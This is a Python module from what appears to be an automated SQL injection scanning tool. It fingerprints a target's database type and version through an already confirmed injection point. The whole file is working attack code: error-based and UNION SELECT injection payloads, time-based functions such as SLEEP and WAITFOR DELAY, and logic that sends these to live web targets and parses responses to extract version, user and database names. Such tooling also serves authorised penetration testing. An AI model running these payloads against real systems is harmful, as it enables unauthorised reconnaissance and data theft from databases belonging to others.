"""
Database fingerprinting module for identifying database types and versions.
Uses error messages, function responses, and behavioral characteristics.
"""
import re
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass

from ..core.base import BaseModule, ScanConfig, InjectionPoint, DBType, DB_ERROR_PATTERNS
from ..modules.http_engine import HTTPEngine
from ..utils.logger import get_logger


@dataclass
class DatabaseFingerprint:
    """Database fingerprint information."""
    db_type: DBType
    version: Optional[str] = None
    confidence: float = 0.0
    evidence: List[str] = None
    
    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []


class DatabaseFingerprinter(BaseModule):
    """
    Advanced database fingerprinting engine.
    Identifies database type, version, and configuration through various techniques.
    """
    
    def __init__(self, config: ScanConfig):
        super().__init__(config)
        self.logger = get_logger("fingerprinter")
        self.http_engine = HTTPEngine(config)
        
        # Database-specific function tests
        self.db_functions = {
            DBType.MYSQL: [
                "VERSION()",
                "@@VERSION",
                "@@VERSION_COMMENT",
                "USER()",
                "DATABASE()",
                "CONNECTION_ID()",
                "LAST_INSERT_ID()",
                "FOUND_ROWS()",
                "ROW_COUNT()"
            ],
            DBType.POSTGRESQL: [
                "VERSION()",
                "CURRENT_DATABASE()",
                "CURRENT_USER",
                "SESSION_USER",
                "PG_BACKEND_PID()",
                "INET_CLIENT_ADDR()",
                "INET_SERVER_ADDR()",
                "PG_POSTMASTER_START_TIME()"
            ],
            DBType.MSSQL: [
                "@@VERSION",
                "@@SERVERNAME",
                "@@SERVICENAME",
                "DB_NAME()",
                "USER_NAME()",
                "SUSER_NAME()",
                "HOST_NAME()",
                "@@LANGUAGE"
            ],
            DBType.ORACLE: [
                "BANNER FROM V$VERSION",
                "USER FROM DUAL",
                "SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL",
                "SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL",
                "SYSDATE FROM DUAL",
                "SYSTIMESTAMP FROM DUAL"
            ],
            DBType.SQLITE: [
                "sqlite_version()",
                "sqlite_source_id()",
                "sqlite_compileoption_used('THREADSAFE')",
                "CURRENT_TIMESTAMP",
                "CURRENT_DATE",
                "CURRENT_TIME"
            ]
        }
        
        # Database-specific syntax tests
        self.syntax_tests = {
            DBType.MYSQL: [
                "CONCAT('a','b')",
                "SUBSTRING('test',1,2)",
                "CHAR(65)",
                "HEX('test')",
                "MD5('test')",
                "SLEEP(0)",
                "BENCHMARK(1,MD5('test'))"
            ],
            DBType.POSTGRESQL: [
                "'a'||'b'",
                "SUBSTR('test',1,2)",
                "CHR(65)",
                "ENCODE('test','hex')",
                "MD5('test')",
                "PG_SLEEP(0)",
                "EXTRACT(EPOCH FROM NOW())"
            ],
            DBType.MSSQL: [
                "'a'+'b'",
                "SUBSTRING('test',1,2)",
                "CHAR(65)",
                "CONVERT(VARCHAR,123)",
                "HASHBYTES('MD5','test')",
                "WAITFOR DELAY '00:00:00'",
                "DATEDIFF(SECOND,'1970-01-01',GETDATE())"
            ],
            DBType.ORACLE: [
                "'a'||'b'",
                "SUBSTR('test',1,2)",
                "CHR(65)",
                "RAWTOHEX(UTL_RAW.CAST_TO_RAW('test'))",
                "DBMS_CRYPTO.HASH(UTL_RAW.CAST_TO_RAW('test'),2)",
                "DBMS_PIPE.RECEIVE_MESSAGE('a',0)",
                "EXTRACT(SECOND FROM SYSTIMESTAMP)"
            ],
            DBType.SQLITE: [
                "'a'||'b'",
                "SUBSTR('test',1,2)",
                "CHAR(65)",
                "HEX('test')",
                "LENGTH('test')",
                "RANDOM()",
                "STRFTIME('%s','now')"
            ]
        }
        
        # Version extraction patterns
        self.version_patterns = {
            DBType.MYSQL: [
                r'(\d+\.\d+\.\d+)',
                r'MySQL (\d+\.\d+\.\d+)',
                r'MariaDB (\d+\.\d+\.\d+)'
            ],
            DBType.POSTGRESQL: [
                r'PostgreSQL (\d+\.\d+(?:\.\d+)?)',
                r'(\d+\.\d+(?:\.\d+)?)'
            ],
            DBType.MSSQL: [
                r'Microsoft SQL Server (\d{4})',
                r'SQL Server (\d+\.\d+\.\d+)',
                r'(\d+\.\d+\.\d+\.\d+)'
            ],
            DBType.ORACLE: [
                r'Oracle Database (\d+c?)',
                r'Release (\d+\.\d+\.\d+)',
                r'(\d+\.\d+\.\d+\.\d+\.\d+)'
            ],
            DBType.SQLITE: [
                r'(\d+\.\d+\.\d+)',
                r'SQLite (\d+\.\d+\.\d+)'
            ]
        }
    
    def fingerprint_database(self, injection_point: InjectionPoint) -> DatabaseFingerprint:
        """
        Main fingerprinting method that identifies database type and version.
        
        Args:
            injection_point: A confirmed SQL injection point
            
        Returns:
            DatabaseFingerprint with identification results
        """
        self.logger.info(f"Fingerprinting database at {injection_point.parameter}")
        
        fingerprints = []
        
        # 1. Error-based fingerprinting (most reliable)
        error_fingerprint = self._fingerprint_by_errors(injection_point)
        if error_fingerprint.db_type != DBType.UNKNOWN:
            fingerprints.append(error_fingerprint)
        
        # 2. Function-based fingerprinting
        function_fingerprint = self._fingerprint_by_functions(injection_point)
        if function_fingerprint.db_type != DBType.UNKNOWN:
            fingerprints.append(function_fingerprint)
        
        # 3. Syntax-based fingerprinting
        syntax_fingerprint = self._fingerprint_by_syntax(injection_point)
        if syntax_fingerprint.db_type != DBType.UNKNOWN:
            fingerprints.append(syntax_fingerprint)
        
        # 4. Behavioral fingerprinting
        behavior_fingerprint = self._fingerprint_by_behavior(injection_point)
        if behavior_fingerprint.db_type != DBType.UNKNOWN:
            fingerprints.append(behavior_fingerprint)
        
        # Combine results and return best match
        return self._combine_fingerprints(fingerprints)
    
    def _fingerprint_by_errors(self, injection_point: InjectionPoint) -> DatabaseFingerprint:
        """Fingerprint database through error messages."""
        self.logger.debug("Fingerprinting by error messages")
        
        # Error-inducing payloads
        error_payloads = [
            "'",
            "1'",
            "' AND 1=CONVERT(int, @@version)--",
            "' AND 1=CAST(@@version AS int)--",
            "' UNION SELECT @@version--",
            "' UNION SELECT version()--",
            "' UNION SELECT sqlite_version()--"
        ]
        
        for payload in error_payloads:
            test_payload = injection_point.original_value + payload
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            # Check for database-specific errors
            for db_type, patterns in DB_ERROR_PATTERNS.items():
                for pattern in patterns:
                    match = re.search(pattern, response['content'], re.IGNORECASE)
                    if match:
                        evidence = [f"Error pattern match: {match.group(0)}"]
                        version = self._extract_version(response['content'], db_type)
                        
                        return DatabaseFingerprint(
                            db_type=db_type,
                            version=version,
                            confidence=0.9,  # High confidence for error-based detection
                            evidence=evidence
                        )
        
        return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
    
    def _fingerprint_by_functions(self, injection_point: InjectionPoint) -> DatabaseFingerprint:
        """Fingerprint database through function availability."""
        self.logger.debug("Fingerprinting by database functions")
        
        # Test database-specific functions
        for db_type, functions in self.db_functions.items():
            positive_responses = 0
            evidence = []
            
            for func in functions[:3]:  # Test first 3 functions to avoid too many requests
                # Try to extract function result via UNION
                union_payload = f"' UNION SELECT {func}--"
                test_payload = injection_point.original_value + union_payload
                
                request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
                response = self.http_engine.make_request(**request_params)
                
                # Check if function executed successfully
                if self._function_executed_successfully(response, func, db_type):
                    positive_responses += 1
                    evidence.append(f"Function {func} executed successfully")
                    
                    # Try to extract version from function response
                    if any(version_func in func.lower() for version_func in ['version', '@@version']):
                        version = self._extract_version(response['content'], db_type)
                        if version:
                            evidence.append(f"Version extracted: {version}")
            
            # Calculate confidence based on positive responses
            if positive_responses > 0:
                confidence = positive_responses / len(functions[:3])
                if confidence >= 0.5:  # At least half the functions worked
                    return DatabaseFingerprint(
                        db_type=db_type,
                        confidence=confidence * 0.8,  # Slightly lower than error-based
                        evidence=evidence
                    )
        
        return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
    
    def _fingerprint_by_syntax(self, injection_point: InjectionPoint) -> DatabaseFingerprint:
        """Fingerprint database through syntax differences."""
        self.logger.debug("Fingerprinting by syntax differences")
        
        # Test database-specific syntax
        for db_type, syntax_tests in self.syntax_tests.items():
            working_syntax = 0
            evidence = []
            
            for syntax in syntax_tests[:3]:  # Test first 3 syntax patterns
                # Try syntax via UNION
                union_payload = f"' UNION SELECT {syntax}--"
                test_payload = injection_point.original_value + union_payload
                
                request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
                response = self.http_engine.make_request(**request_params)
                
                # Check if syntax worked
                if self._syntax_worked(response, syntax, db_type):
                    working_syntax += 1
                    evidence.append(f"Syntax {syntax} worked")
            
            # Calculate confidence
            if working_syntax > 0:
                confidence = working_syntax / len(syntax_tests[:3])
                if confidence >= 0.5:
                    return DatabaseFingerprint(
                        db_type=db_type,
                        confidence=confidence * 0.6,  # Lower confidence than function-based
                        evidence=evidence
                    )
        
        return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
    
    def _fingerprint_by_behavior(self, injection_point: InjectionPoint) -> DatabaseFingerprint:
        """Fingerprint database through behavioral characteristics."""
        self.logger.debug("Fingerprinting by behavioral characteristics")
        
        behaviors = []
        
        # Test NULL handling
        null_behavior = self._test_null_behavior(injection_point)
        if null_behavior:
            behaviors.append(null_behavior)
        
        # Test string concatenation
        concat_behavior = self._test_concatenation_behavior(injection_point)
        if concat_behavior:
            behaviors.append(concat_behavior)
        
        # Test comment styles
        comment_behavior = self._test_comment_behavior(injection_point)
        if comment_behavior:
            behaviors.append(comment_behavior)
        
        # Analyze behavioral patterns
        if behaviors:
            return self._analyze_behavioral_patterns(behaviors)
        
        return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
    
    def _test_null_behavior(self, injection_point: InjectionPoint) -> Optional[Dict[str, Any]]:
        """Test how database handles NULL values."""
        # Test NULL concatenation behavior
        null_tests = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 'a'||NULL--",  # PostgreSQL/Oracle style
            "' UNION SELECT CONCAT('a',NULL)--",  # MySQL style
            "' UNION SELECT 'a'+NULL--"  # MSSQL style
        ]
        
        for test in null_tests:
            test_payload = injection_point.original_value + test
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            # Analyze response for NULL behavior patterns
            # This is a simplified implementation
            if 'null' in response['content'].lower():
                return {'type': 'null_handling', 'test': test, 'response_excerpt': response['content'][:200]}
        
        return None
    
    def _test_concatenation_behavior(self, injection_point: InjectionPoint) -> Optional[Dict[str, Any]]:
        """Test string concatenation methods."""
        concat_tests = [
            ("' UNION SELECT 'a'||'b'--", "ab", "oracle_postgresql"),
            ("' UNION SELECT CONCAT('a','b')--", "ab", "mysql"),
            ("' UNION SELECT 'a'+'b'--", "ab", "mssql")
        ]
        
        for test, expected, db_hint in concat_tests:
            test_payload = injection_point.original_value + test
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            if expected in response['content']:
                return {'type': 'concatenation', 'method': db_hint, 'test': test}
        
        return None
    
    def _test_comment_behavior(self, injection_point: InjectionPoint) -> Optional[Dict[str, Any]]:
        """Test comment style support."""
        comment_tests = [
            ("' --", "sql_standard"),
            ("' #", "mysql"),
            ("' /**/", "all_databases"),
            ("';-- ", "mssql_extended")
        ]
        
        baseline = self._get_baseline_response(injection_point)
        
        for test, comment_type in comment_tests:
            test_payload = injection_point.original_value + test
            request_params = self.http_engine.build_request_with_payload(injection_point, test_payload)
            response = self.http_engine.make_request(**request_params)
            
            # If response is similar to baseline, comment worked
            if self._responses_similar(response, baseline):
                return {'type': 'comment', 'style': comment_type, 'test': test}
        
        return None
    
    def _analyze_behavioral_patterns(self, behaviors: List[Dict[str, Any]]) -> DatabaseFingerprint:
        """Analyze behavioral patterns to determine database type."""
        scores = {db_type: 0 for db_type in DBType}
        evidence = []
        
        for behavior in behaviors:
            if behavior['type'] == 'concatenation':
                if behavior['method'] == 'mysql':
                    scores[DBType.MYSQL] += 1
                    evidence.append("MySQL CONCAT function worked")
                elif behavior['method'] == 'oracle_postgresql':
                    scores[DBType.ORACLE] += 0.5
                    scores[DBType.POSTGRESQL] += 0.5
                    evidence.append("Oracle/PostgreSQL || concatenation worked")
                elif behavior['method'] == 'mssql':
                    scores[DBType.MSSQL] += 1
                    evidence.append("MSSQL + concatenation worked")
            
            elif behavior['type'] == 'comment':
                if behavior['style'] == 'mysql':
                    scores[DBType.MYSQL] += 0.5
                    evidence.append("MySQL # comment style worked")
                elif behavior['style'] == 'mssql_extended':
                    scores[DBType.MSSQL] += 0.5
                    evidence.append("MSSQL extended comment style worked")
        
        # Find highest scoring database
        best_db = max(scores, key=scores.get)
        best_score = scores[best_db]
        
        if best_score > 0:
            confidence = min(best_score / len(behaviors), 1.0) * 0.4  # Lower confidence for behavioral
            return DatabaseFingerprint(
                db_type=best_db,
                confidence=confidence,
                evidence=evidence
            )
        
        return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
    
    def _combine_fingerprints(self, fingerprints: List[DatabaseFingerprint]) -> DatabaseFingerprint:
        """Combine multiple fingerprinting results."""
        if not fingerprints:
            return DatabaseFingerprint(db_type=DBType.UNKNOWN, confidence=0.0)
        
        # Sort by confidence
        fingerprints.sort(key=lambda x: x.confidence, reverse=True)
        
        # If highest confidence result is very confident, return it
        best = fingerprints[0]
        if best.confidence >= 0.8:
            return best
        
        # Otherwise, look for consensus
        db_votes = {}
        for fp in fingerprints:
            if fp.db_type not in db_votes:
                db_votes[fp.db_type] = []
            db_votes[fp.db_type].append(fp)
        
        # Find database type with highest total confidence
        best_total_confidence = 0
        best_consensus = None
        
        for db_type, fps in db_votes.items():
            total_confidence = sum(fp.confidence for fp in fps)
            if total_confidence > best_total_confidence:
                best_total_confidence = total_confidence
                best_consensus = fps
        
        if best_consensus:
            # Combine evidence from all fingerprints for this database
            combined_evidence = []
            combined_version = None
            
            for fp in best_consensus:
                combined_evidence.extend(fp.evidence)
                if fp.version and not combined_version:
                    combined_version = fp.version
            
            return DatabaseFingerprint(
                db_type=best_consensus[0].db_type,
                version=combined_version,
                confidence=min(best_total_confidence / len(best_consensus), 1.0),
                evidence=combined_evidence
            )
        
        return best
    
    def _extract_version(self, content: str, db_type: DBType) -> Optional[str]:
        """Extract version information from response content."""
        if db_type not in self.version_patterns:
            return None
        
        for pattern in self.version_patterns[db_type]:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        
        return None
    
    def _function_executed_successfully(self, response: Dict[str, Any], func: str, db_type: DBType) -> bool:
        """Check if a database function executed successfully."""
        # Look for function-specific indicators in response
        content = response['content'].lower()
        
        # Check for absence of syntax errors
        error_indicators = ['syntax error', 'unknown function', 'invalid', 'error']
        if any(error in content for error in error_indicators):
            return False
        
        # Look for positive indicators based on function type
        if 'version' in func.lower():
            version_indicators = ['mysql', 'postgresql', 'microsoft', 'oracle', 'sqlite']
            return any(indicator in content for indicator in version_indicators)
        
        # For other functions, assume success if no errors and response changed
        return len(content) > 0
    
    def _syntax_worked(self, response: Dict[str, Any], syntax: str, db_type: DBType) -> bool:
        """Check if syntax test worked."""
        content = response['content'].lower()
        
        # Check for syntax errors
        syntax_errors = ['syntax error', 'invalid syntax', 'unexpected']
        if any(error in content for error in syntax_errors):
            return False
        
        # Look for expected results based on syntax
        if 'concat' in syntax.lower() or '+' in syntax or '||' in syntax:
            # String concatenation test
            return 'ab' in content or len(content) > 10  # Some content returned
        
        return True  # Assume success if no obvious errors
    
    def _get_baseline_response(self, injection_point: InjectionPoint) -> Dict[str, Any]:
        """Get baseline response for comparison."""
        request_params = self.http_engine.build_request_with_payload(
            injection_point, injection_point.original_value
        )
        return self.http_engine.make_request(**request_params)
    
    def _responses_similar(self, response1: Dict[str, Any], response2: Dict[str, Any]) -> bool:
        """Check if two responses are similar."""
        # Simple similarity check
        if response1['status_code'] != response2['status_code']:
            return False
        
        len_diff = abs(len(response1['content']) - len(response2['content']))
        return len_diff < 100  # Allow small differences